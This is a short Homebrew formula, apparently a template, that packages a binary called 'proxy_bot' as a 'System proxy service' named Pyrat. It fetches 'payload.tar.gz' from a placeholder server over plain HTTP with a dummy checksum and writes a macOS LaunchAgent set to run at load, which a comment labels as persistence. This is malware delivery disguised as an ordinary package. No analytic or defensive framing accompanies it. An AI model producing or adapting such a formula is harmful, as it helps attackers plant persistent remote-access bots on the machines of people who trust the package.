class Pyrat < Formula
  desc "System proxy service"
  homepage "https://example.com"
  url "http://your-server.com/payload.tar.gz"
  sha256 "a1b2c3d4e5f6..." # Generate with sha256sum

  def install
    bin.install "proxy_bot" => "pyrat"
    # Add persistence via LaunchAgent
    (prefix/"Library/LaunchAgents/com.pyrat.plist").write <<~EOF
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
      <plist version="1.0">
      <dict>
        <key>Label</key><string>com.pyrat</string>
        <key>Program</key><string>#{bin}/pyrat</string>
        <key>RunAtLoad</key><true/>
      </dict></plist>
    EOF
  end
end
